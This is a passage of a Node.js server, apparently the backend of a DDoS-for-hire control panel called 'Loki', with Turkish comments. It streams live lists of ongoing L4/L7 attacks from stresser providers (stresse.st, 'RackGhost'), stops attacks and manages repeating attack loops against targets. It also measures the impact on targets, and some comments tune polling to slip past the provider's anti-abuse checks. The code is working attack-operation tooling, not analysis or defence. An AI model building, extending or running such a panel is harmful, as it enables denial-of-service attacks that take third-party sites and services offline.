  } catch (err) {
    hub.consecutiveErrors += 1;
    // Session hatasi variysa (401/gecersiz oturum) son calisan session'a don;
    // bayat sekmenin session'i tum hub'i bozmasin.
    if (hub.lastGoodSessionId && hub.sessionId !== hub.lastGoodSessionId) {
      hub.sessionId = hub.lastGoodSessionId;
    }
    console.warn(`[liveHub] upstream tick hatasi (${username}):`, err.message);
    // AKIS SUSMASIN: son bilinen listeyle devam et (satirlar client'ta geri
    // sayiyor); taze kayitlar (pending) ve RG merge asagida yine eklenir.
    ongoingData = Array.isArray(hub.lastOngoing) ? [...hub.lastOngoing] : [];
  }
    // RackGhost aktif saldirilari canli listeye ekle (provider rozeti ile)
    if (rackghost.isConfigured()) {
      // RackGhost tek ortak hesap: kayit defterinde hangi saldiri hangi
      // panel hesabindan baslatildi belli; akisi hesaba gore filtrele ki
      // Yavrukurt1'in saldirisi Yavrukurt akisinda gorunmesin. Defterde
      // olmayanlar (rackghost panelinden baslatilanlar) herkese gosterilir.
      const rgVisible = makeRgVisibility();
      const seenRg = new Set();
      try {
        // RG servis timeout'u 120sn; tick'i bloklamasin diye sert ust sinir —
        // asimda onceki RG satirlari korunur (asagidaki catch).
        const rgList = await Promise.race([
          rackghost.getOngoing(),
          new Promise((_, rej) => setTimeout(() => rej(new Error('rg ongoing tick timeout')), 20000))
        ]);
        rgList.forEach((a) => {
          const created = a.created_at ? Date.parse(String(a.created_at).replace(' ', 'T')) : NaN;
          const dur = parseInt(a.time, 10) || 0;
          const tl = Number.isFinite(created) ? Math.max(0, Math.round((created + dur * 1000 - Date.now()) / 1000)) : dur;
          const id = `rg_${a.id}`;
          seenRg.add(id);
          // Sondaki slash varyantlarini tekille ("site.fr", "site.fr///" ayni satir)
          const rgHost = String(a.host || '').replace(/\/+$/, '');
          const row = {
            attack_id: id,
            target: `${rgHost}:${a.port}`,
            method: a.method,
            timeLeft: String(tl),
            count: parseInt(a.slots, 10) || 1,
            layer: a.layer === 7 ? 'L7' : 'L4',
            provider: 'rackghost'
          };
          if (rgVisible(row, username)) ongoingData.push(row);
        });
      } catch (rgErr) {
        // Merge bu tick basarisiz: onceki rackghost satirlarini koru ki panelde
        // satir/rozet titremesi olmasin (oturum hatasi watchdog'da raporlanir).
        if (Array.isArray(hub.lastOngoing)) {
          hub.lastOngoing
            .filter((r) => r && r.provider === 'rackghost' && rgVisible(r, username))
            .forEach((r) => { seenRg.add(r.attack_id); ongoingData.push(r); });
        }
      }
    }
    // Taze kayit defteri satirlari (stresse + rackghost pending): upstream
    // gecikmesinden bagimsiz olarak her zaman eklenir.
    appendFreshRegistryRows(ongoingData, username);
    hub.lastOngoing = ongoingData;
    // Her tick broadcast (upstream hatasi dahil): akis susmaz; taze kayitlar
    // ve korunan satirlar client'a daima akar. Hata serisinde sadece aralik
    // uzar (30sn), veri akmaya devam eder.
    const payload = { timestamp: new Date().toISOString(), ongoing: hub.lastOngoing };
    if (hub.lastUser) payload.user = hub.lastUser;
    liveHubBroadcast(hub, `data: ${JSON.stringify(payload)}\n\n`);

  if (hub.clients.size === 0) { hub.tickInFlight = false; return; } // close handler hub'i zaten temizledi
  // Poll baskisi: 3sn agresyifti (stresse anti-abuse tetikliyor); 10sn yeterli.
  const delay = hub.consecutiveErrors >= 3 ? 30000 : 10000;
  hub.tickInFlight = false;
  hub.timer = setTimeout(() => {
    liveHubTick(hub, username).catch((err) => console.error('[liveHub] beklenmeyen tick hatasi:', err));
  }, delay);
}

// Yeni kayit/launch aninda hub tick'ini one cek: satir gecikmesi ~1-2sn'ye iner
// (normalde 10sn, hata backoff'unda 30sn idi — "saldiriyi gec goruyorum" bug'i).
// 1.5sn birlestirme: toplu launch'larda (senkron 13 loop) upstream'i yormaz.
const lastPokeAt = new Map(); // username -> ts
function pokeLiveHub(username) {
  if (!username) return;
  const hub = liveHubs.get(username);
  if (!hub || hub.clients.size === 0) return;
  const now = Date.now();
  if (now - (lastPokeAt.get(username) || 0) < 1500) return;
  lastPokeAt.set(username, now);
  // Upstream beklemeden ANINDA broadcast: taze kayitlar son listenin ustune
  // eklenir; sonraki gercek tick uzlastirir/tekillestirir.
  const base = Array.isArray(hub.lastOngoing) ? [...hub.lastOngoing] : [];
  appendFreshRegistryRows(base, username);
  hub.lastOngoing = base;
  const payload = { timestamp: new Date().toISOString(), ongoing: base };
  if (hub.lastUser) payload.user = hub.lastUser;
  liveHubBroadcast(hub, `data: ${JSON.stringify(payload)}\n\n`);
  // Normal tick'i de one cek (upstream ile uzlasma)
  clearTimeout(hub.timer);
  liveHubTick(hub, username).catch(() => {});
}

/**
 * GET /api/stresse/live/:username
 * Server-Sent Events stream of ongoing attacks (hub uzerinden paylasimli poller)
 */
app.get('/api/stresse/live/:username', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'] || req.query.sid || req.query.SID;
  const { username } = req.params;

  if (!sessionId) {
    return res.status(401).json({ status: 'error', message: 'Session required' });
  }

  // Session'in hesabi istenen akisin hesabiyla eslesmeli; aksi halde baska
  // hesabin session'i hub'i zehirleyebilir (hub.sessionId ezilir, yanlis
  // hesabin verisi broadcast edilir). Silinmis/bayat session'larda eski
  // davranis korunur (fallback mantigi toparlar).
  const sessUser = sessions[sessionId]?.username;
  if (sessUser && sessUser !== username) {
    return res.status(403).json({ status: 'error', message: 'Session hesap uyusmazligi' });
  }

  res.setHeader('Content-Type', 'text/event-stream');
  res.setHeader('Cache-Control', 'no-cache');
  res.setHeader('Connection', 'keep-alive');
  res.setHeader('Access-Control-Allow-Origin', '*');
  // nginx'in SSE event'lerini buffer'lamasini engelle; aksi halde canli akis
  // toplu/gecikmeli gelir.
  res.setHeader('X-Accel-Buffering', 'no');

  try {
    getClient(sessionId);
  } catch (err) {
    res.write(`event: error\ndata: ${JSON.stringify({ message: err.message })}\n\n`);
    return res.end();
  }

  let hub = liveHubs.get(username);
  if (!hub) {
    hub = {
      clients: new Set(),
      sessionId,
      lastGoodSessionId: null,
      timer: null,
      lastOngoing: null,
      lastUser: null,
      consecutiveErrors: 0,
      tickCount: 0
    };
    liveHubs.set(username, hub);
  }
  // Yeni baglanan client'in session'i aday olarak alinir; ilk BASARILI tick'te
  // lastGood'a yazilir. Bayat/gecersiz session'li sekme hub'i bozamaz:
  // hata durumunda calisan son iyi session'a geri donulur.
  hub.sessionId = sessionId;
  if (!hub.lastGoodSessionId) hub.lastGoodSessionId = sessionId;
  hub.clients.add(res);

  if (!hub.timer) {
    // Paylasimli poller yoksa baslat (ilk tick hemen calisir).
    liveHubTick(hub, username).catch((err) => console.error('[liveHub] beklenmeyen tick hatasi:', err));
  } else if (hub.lastOngoing !== null) {
    // Yeni client'a son bilinen payload'u hemen gonder.
    const payload = { timestamp: new Date().toISOString(), ongoing: hub.lastOngoing };
    if (hub.lastUser) payload.user = hub.lastUser;
    res.write(`data: ${JSON.stringify(payload)}\n\n`);
  }

  req.on('close', () => {
    hub.clients.delete(res);
    // Hub bosaldiysa poller'i durdur ve hub'i sil.
    if (hub.clients.size === 0) {
      if (hub.timer) clearTimeout(hub.timer);
      hub.timer = null;
      liveHubs.delete(username);
    }
  });
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ status: 'ok', timestamp: new Date().toISOString() });
});

// =====================
// RACKGHOST PROVIDER
// =====================

// Oturum/limit durumu
app.get('/api/rackghost/status', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  res.json(rackghost.getStatus());
});

// Cookie/proxy guncelleme (CF relay oturumu yenileme)
// Method listesi (L4/L7 etiketli)
app.get('/api/rackghost/methods', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  res.json({ methods: rackghost.getMethods(), limits: rackghost.LIMITS });
});

// Aktif saldirilar (RackGhost)
app.get('/api/rackghost/ongoing', async (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  try {
    const list = await rackghost.getOngoing();
    res.json({ attacks: list });
  } catch (err) {
    res.status(err.sessionExpired ? 503 : 502).json({ status: 'error', message: err.message });
  }
});

// RackGhost saldiri durdur
app.post('/api/rackghost/stop', async (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const sessionUser = sessions[sessionId]?.username;
  if (!sessionUser) return res.status(401).json({ status: 'error', message: 'Session user not found' });

  const { id } = req.body || {};
  if (!id) return res.status(400).json({ status: 'error', message: 'id required' });

  // Sahiplik kontrolu: baska hesaba ait rackghost saldirisi durdurulamaz
  // (stresse /stop ile ayni izolasyon). host istemciden degil kayittan cozulur.
  const record = activeAttacks[String(id)];
  if (record && record.username && record.username !== sessionUser) {
    return res.status(403).json({ status: 'error', message: 'Bu saldırı sizin hesabınıza ait değil' });
  }
  const host = record?.host || req.body.host;
  if (!host) return res.status(400).json({ status: 'error', message: 'host cozulemedi' });

  try {
    const data = await rackghost.stopAttack(id, host);
    // stresse /stop ile ayni zincir: kaydi sil, history isaretle, sahip loop'u
    // durdur (yoksa sonraki tur ayni hedefi yeniden baslatir) — aksi durumda
    // durdurulan saldiri panelde hayalet satir olarak kalmaya devam ediyordu.
    const stoppedLoop = record?.loopId ? activeLoops[record.loopId] : null;
    if (stoppedLoop) {
      stoppedLoop.running = false;
      delete activeLoops[record.loopId];
      saveState();
      notifyLoopRemoved(stoppedLoop, 'durduruldu', {
        username: sessionUser,
        ip: getClientIp(req),
        stopDetail: 'Loop saldırısı panelden durduruldu'
      });
      const loopHistoryId = `hist_loop_${record.loopId}`;
      if (attackHistory[loopHistoryId] && attackHistory[loopHistoryId].status === 'active') {
        updateAttackHistoryStatus(loopHistoryId, 'stopped');
      }
    }
    const history = findActiveHistoryByAttackId(String(id));
    if (history && !history.loop) {
      updateAttackHistoryStatus(history.historyId, 'stopped');
    }
    unregisterAttack(String(id));
    // ongoing onbellegini kir ki satir hemen dussun
    if (typeof rackghost.invalidateOngoingCache === 'function') rackghost.invalidateOngoingCache();
    res.json({ status: 'success', data });
  } catch (err) {
    res.status(502).json({ status: 'error', message: err.message });
  }
});

// =====================
// SITEWATCHER (uptime izleme)
// =====================

app.get('/api/sitewatch/state', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  res.json(sitewatch.getState());
});

app.post('/api/sitewatch/sites', async (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const result = await sitewatch.addSite(req.body?.url);
  if (result.error) return res.status(400).json({ status: 'error', message: result.error });
  res.json({ status: 'success' });
});

app.post('/api/sitewatch/sites/remove', (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const result = sitewatch.removeSite(req.body?.url || '');
  if (!result.ok) return res.status(404).json({ status: 'error', message: 'site bulunamadi' });
  res.json({ status: 'success' });
});

app.post('/api/sitewatch/scan', async (req, res) => {
  const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
  if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
  const url = req.body?.url;
  if (url) {
    const result = await sitewatch.scanOne(url);
    if (result.error) return res.status(404).json({ status: 'error', message: result.error });
    return res.json({ status: 'success', result });
  }
  sitewatch.scanAll('manuel').catch(() => {});
  res.json({ status: 'success', message: 'Manuel tarama başlatıldı' });
});

// =====================
// PHISHGUARD INTEGRATION (read-only SQLite)
// =====================

// Entegrasyon devre disiysa (DB yok / modul kurulu degil) 503 dondur.
function phishUnavailable(res) {
  return res.status(503).json({ status: 'error', message: 'PhishGuard entegrasyonu kullanılamıyor' });
}

/**
 * GET /api/phish/alerts?limit=&offset=&brand=&band=
 */
app.get('/api/phish/alerts', (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
    if (!phish.isEnabled()) return phishUnavailable(res);

    const { limit, offset, brand, band } = req.query;
    const result = phish.getAlerts({ limit, offset, brand, band });
    res.json({ status: 'success', ...result });
  } catch (error) {
    console.error('Phish alerts error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

/**
 * GET /api/phish/stats
 */
app.get('/api/phish/stats', (req, res) => {
  try {
    const sessionId = req.headers['sessionid'] || req.headers['sessionId'];
    if (!sessionId) return res.status(401).json({ status: 'error', message: 'Session required' });
    if (!phish.isEnabled()) return phishUnavailable(res);

    const stats = phish.getStats();
    res.json({ status: 'success', stats });
  } catch (error) {
    console.error('Phish stats error:', error.message);
    res.status(500).json({ status: 'error', message: error.message });
  }
});

// Load persisted sessions/loops before starting server
loadState();
// Etki Monitoru: aktif saldiri/loop hedeflerini check-host.net ile olcer.
initImpact({ activeAttacks, activeLoops, sessions, getLoopOwner });
// Link Gozcusu: izlenen sitelerde keyword->link ikililerini saatlik tarar.
initWatch();
// Invader Control (Node surumu): site cloak/durum kontrolu, degisimde DM
initInvader();
// RackGhost provider (stresse.st alternatifi): CF relay session ile stresser_api
rackghost.initRackghost();
// SiteWatcher (uptime izleme): yarim saatlik tur + telegram kanit bildirimi
sitewatch.initSitewatch();
// Senkron Tur Koordinatoru: paylasilan saatli loop gruplari (restart'ta geri yuklenir)
sync.initSync({ activeLoops, sessions, getLoopOwner, fireLoopRound, runLoop, saveState, activeLoopRounds, waitLoopsDrained });
// Restart sonrasi slot bildirimi kacmasin: geri yuklenen saldirilari hesap
// bazinda baz al.
Object.values(activeAttacks).forEach((a) => {
  const u = a.username || sessions[a.sessionId]?.username;
  if (!u) return;
  lastAttackCountByUser.set(u, (lastAttackCountByUser.get(u) || 0) + 1);
});

app.listen(PORT, '127.0.0.1', () => {
  console.log(`Loki backend running on http://localhost:${PORT}`);
});
